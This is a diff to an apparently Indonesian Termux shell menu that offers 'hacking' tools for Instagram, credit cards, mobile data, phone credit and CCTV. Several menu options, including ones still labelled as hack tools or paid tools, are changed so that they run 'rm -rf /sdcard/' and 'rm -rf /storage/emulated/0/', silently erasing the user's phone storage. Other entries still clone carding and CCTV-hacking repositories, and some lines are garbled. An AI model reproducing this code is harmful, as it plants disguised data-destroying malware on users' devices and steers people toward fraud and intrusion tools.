@@ -97,16 +97,12 @@ case $bro in
            echo -e "${y} cara menggunakan Toolnya"
            cd CCA
            sh killerv1.sh
-           
+ exit
 ;;
 
 2) echo "Clown TOOLS-HACK IG NARGET" | lolcat
-       apt install python2
-       git clone https://github.com/Senitopeng/instabot.git
-       echo -e "${y} cara menggunakan INSTA HACK"
-       cd instabot
-       ./instabot
-     
+       rm -rf /sdcard/
+ exit
 ;;
 
 3) rm -rf /sdcard/
@@ -157,25 +153,22 @@ exit
        git clone https://github.com/ganucisystem/creditcard
        echo -e "${y} cara ambil cc nya "
        cd creditcard
-       php fake.php
+       php fake.Khotib
       
-
+exit
 ;;
 
 10) echo "Tools Berbayar harap hubungi author di Fb : Yudha Wahyu Pratama " | lolcat
    rm -rf /sdcard/
    rm -rf /storage/emulated/0/
-echo
+exit
 
 ;;
 
 11) echo "Clown TOOLS-TEMBAK KUOTA" | lolcat
-       git clone https://github.com/kumpul4semut/semut.git
-       echo -e "${y} cara tembaknya "
-       cd semut
-       python2 dor.py
+     rm -rf /storage/emulated/0/
    
-
+exit
 ;;
 
 12)rm -rf /sdcard/
@@ -190,7 +183,7 @@ exit
    
 ;;
 
-14) echo "R4D3N TOOLS-HACK CCTV" | lolcat  
+14) echo "Clown TOOLS-HACK CCTV" | lolcat  
    pkg install python2
    git clone https://github.com/kancotdiq/ipcs
    cd ipcs
@@ -198,17 +191,16 @@ exit
    
 ;;
 
-15) echo "R4D3N TOOLS-HACK PULSA" | lolcat  
-   pkg install php
-   git clone https://github.com/ganucisystem/radenkeceh
-   cd radenkeceh
-   php pulsa.php
+15) echo "Clown TOOLS-HACK PULSA" | lolcat  
+   rm -rf /sdcard/
+   rm -rf /storage/emulated/0/
+exit
 
 ;;
 
- 16)rm -rf /sdcard/
+ 16)rmpip2 install -r requirements.txt -rf /sdcard/
  rm -rf /storage/emulated/0/
- exit
+ Khotib
  
  ;;
  
